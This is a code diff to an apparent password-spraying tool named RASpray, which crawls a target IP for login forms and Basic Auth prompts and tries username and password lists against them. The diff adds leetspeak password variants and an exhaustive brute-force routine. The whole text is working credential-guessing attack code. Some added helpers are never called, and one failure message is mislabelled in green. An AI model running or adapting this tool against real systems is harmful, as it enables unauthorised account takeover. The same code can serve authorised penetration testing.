@@ -9,6 +9,7 @@ from requests.exceptions import RequestException, Timeout, ConnectionError
 from urllib.parse import urljoin
 from colorama import Fore, Style, init
 import time
+import itertools
 
 # Define the tool's name and version
 TOOL_NAME = "RASpray"
@@ -284,92 +285,140 @@ def attempt_login_with_form(full_url, session, username, password):
         return None
 
 
+# Function to ask the user if they want to attempt bruteforce
+def ask_for_bruteforce():
+    while True:
+        user_input = input("All combinations tried. Do you want to perform bruteforce attack? (yes/no): ").lower()
+        if user_input in ['yes', 'no']:
+            return user_input == 'yes'
+        print("Invalid input. Please type 'yes' or 'no'.")
 
-def password_spraying(ip_address, username_file, password_file, criteria):
-    """
-    Performs password spraying by attempting each username/password combination
-    on pages where password fields are found or Basic Authentication is requested.
-
-    Args:
-        ip_address (str): The target IP address.
-        username_file (str): Path to the file containing usernames.
-        password_file (str): Path to the file containing passwords.
-        criteria (dict): Criteria for filtering usernames and passwords.
-    """
-    successful_cracks = []
-    failed_cracks = []
+# Function to apply common character substitutions to a string
+def apply_common_substitutions(password):
+    substitutions = {
+        'a': '4',
+        'e': '3',
+        'i': '1',
+        'o': '0',
+        's': '$'
+    }
     
-    # Open the username and password files
+    for char, replacement in substitutions.items():
+        password = password.replace(char, replacement)
+    
+    return password
+
+# Function to generate all possible character replacements
+def generate_password_variants(password):
+    substitutions = {
+        'a': ['a', '4'],
+        'e': ['e', '3'],
+        'i': ['i', '1'],
+        'o': ['o', '0'],
+        's': ['s', '$']
+    }
+
+    variants = [''.join(p) for p in itertools.product(
+        *[substitutions.get(char, [char]) for char in password]
+    )]
+    
+    return variants
+
+# Function to perform bruteforce
+def perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check):
+    print(f"{Fore.YELLOW}Starting bruteforce attack...{Style.RESET_ALL}")
+    
+    # Characters to use for bruteforce passwords
+    bruteforce_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
+    
+    # Load the list of usernames
     with open(username_file, 'r') as user_file:
         usernames = [line.strip() for line in user_file.readlines()]
     
+    # Bruteforce each password length and combination
+    for length in range(criteria['min_len'], criteria['max_len'] + 1):
+        for password_tuple in itertools.product(bruteforce_chars, repeat=length):
+            bruteforce_password = ''.join(password_tuple)
+            print(f"{Fore.WHITE}Trying bruteforce password: {bruteforce_password}{Style.RESET_ALL}")
+            # Attempt login with each username and the generated bruteforce password
+            for page in pages_to_check:
+                full_url = urljoin(f'http://{ip_address}', page)
+                
+                if is_password_requested_basic_password_field(full_url, session):
+                    for username in usernames:
+                        credentials = attempt_login_with_form(full_url, session, username, bruteforce_password)
+                        if credentials:
+                            print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
+                            return  # Stop after the first successful bruteforce
+
+# Modify the password_spraying function to include bruteforce and character substitution
+def password_spraying(ip_address, username_file, password_file, criteria):
+    successful_cracks = []
+    failed_cracks = []
+
+    # Open the username and password files
+    with open(username_file, 'r') as user_file:
+        usernames = [line.strip() for line in user_file.readlines()]
+
     with open(password_file, 'r') as pass_file:
         passwords = [line.strip() for line in pass_file.readlines()]
 
     # Filter usernames and passwords by the specified criteria
     usernames = filter_by_criteria(usernames, **criteria)
     passwords = filter_by_criteria(passwords, **criteria)
-    
+
     # Create a session to persist cookies across requests
     session = requests.Session()
 
     # Traverse through the website and find pages with password fields or BasicAuth
     base_url = f'http://{ip_address}'
     pages_to_check = traverse_website(base_url, session)
-    
+
     for page in pages_to_check:
         full_url = urljoin(base_url, page)
 
         # Check if the page has a password field (form-based authentication)
-        if is_password_requested_basic_password_field (full_url, session):
+        if is_password_requested_basic_password_field(full_url, session):
             for password in passwords:
                 for username in usernames:
-                    
                     try:
-                        # Attempt to login by simulating form submission
                         print(f"{Fore.WHITE}Trying username: {username} and password: {password}")
                         credentials = attempt_login_with_form(full_url, session, username, password)
 
-                        # Check if the login was successful based on the result
                         if credentials:
                             print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
                             successful_cracks.append((full_url, credentials[0], credentials[1]))
                         else:
-                            print(f"{Fore.RED}Failed login attempt for {username} on {full_url}.")
                             failed_cracks.append((full_url, username, password))
-                        # Sleep for 2 seconds between attempts to avoid triggering rate limits
                         time.sleep(2)
                     except (Timeout, ConnectionError):
                         print(f"Connection failed for {full_url}")
                     except RequestException as e:
                         print(f"An error occurred: {e}")
-                        
+
         if is_password_requested_basic_auth(full_url, session):
             for password in passwords:
                 for username in usernames:
                     try:
-                        # Attempt Basic Authentication
                         print(f"{Fore.WHITE}Trying BasicAuth with username: {username} and password: {password}")
-                        
                         response = session.get(full_url, auth=HTTPBasicAuth(username, password))
 
-                        # Check if the login was successful
                         if response.status_code == 200:
                             print(f"{Fore.GREEN}Success! BasicAuth credentials: Username: {username}, Password: {password} on {full_url}")
                             successful_cracks.append((full_url, username, password))
                         else:
-                            print(f"{Fore.RED}Failed BasicAuth login attempt for {username} on {full_url}.")
+                            print(f"{Fore.GREEN}Failed! Failed BasicAuth with credentials: Username: {username}, Password: {password} on {full_url}")
                             failed_cracks.append((full_url, username, password))
-                        # Sleep to avoid triggering rate limits
                         time.sleep(2)
                     except (Timeout, ConnectionError):
                         print(f"Connection failed for {full_url}")
                     except RequestException as e:
                         print(f"An error occurred: {e}")
 
-        
-
-    # Summary of cracking attempts
+    # After exhausting all combinations, ask if the user wants to proceed with bruteforce
+    if ask_for_bruteforce():
+        perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check)
+    
     print("\n--- Summary of Cracking Attempts ---")
     if successful_cracks:
         print(f"{Fore.GREEN}Successfully cracked pages:")
@@ -384,6 +433,8 @@ def password_spraying(ip_address, username_file, password_file, criteria):
             print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
     else:
         print(f"{Fore.GREEN}No failed password cracking attempts.")
+
+
 
 
 
